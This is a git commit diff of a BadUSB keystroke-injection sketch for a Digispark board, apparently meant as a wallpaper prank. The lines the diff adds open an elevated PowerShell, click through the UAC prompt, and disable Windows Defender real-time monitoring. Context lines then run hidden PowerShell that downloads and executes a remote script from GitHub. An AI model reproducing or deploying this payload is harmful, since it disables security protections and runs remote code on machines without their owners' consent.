56bbdb30a4f97ea974f7b1734bc1dea2c33883f0
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-05 13:00:38 +0000

    adf

--- walllpaper/walllpaper.ino
+++ walllpaper/walllpaper.ino
@@ -7,6 +7,16 @@ void loop() {
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
+ DigiKeyboard.print("powershell.exe");
+ DigiKeyboard.delay(100);
+ DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+ DigiKeyboard.delay(5000);
+ DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+ DigiKeyboard.delay(500);
+ DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
+ DigiKeyboard.delay(100);
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell.exe -WindowStyle hidden @IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/wallpaper.ps1')@");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
